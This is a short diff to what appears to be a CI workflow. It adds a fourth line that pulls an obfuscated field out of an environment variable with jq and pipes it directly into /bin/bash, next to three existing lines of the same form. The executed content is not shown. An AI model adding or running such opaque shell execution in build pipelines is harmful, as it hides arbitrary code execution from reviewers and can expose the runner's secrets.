@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$mpbkv0" | jq -r .vhgow6493 | /bin/bash
           echo $eawax81716 | jq -r .bkv9803 | /bin/bash
           echo $ngsc33 | jq -r .vtvjq36 | /bin/bash
+          echo $vnav18 | jq -r .qqg6142 | /bin/bash
 
       - name: Store artifact
         if: always()
